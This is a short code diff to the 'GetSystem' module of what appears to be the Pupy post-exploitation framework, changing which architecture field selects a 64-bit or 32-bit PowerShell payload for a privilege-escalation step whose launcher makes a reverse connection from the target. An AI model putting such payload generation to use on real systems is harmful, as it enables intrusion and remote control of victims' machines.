@@ -93,7 +93,7 @@ class GetSystem(PupyModule):
             else:
                 self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')
                 clientConfToUse = self.client.get_conf()
-            if '64' in  self.client.desc['os_arch']:
+            if '64' in  self.client.desc['proc_arch']:
                 local_file = pupygen.generate_ps1(clientConfToUse, x64=True)
             else:
                 local_file = pupygen.generate_ps1(clientConfToUse, x86=True)
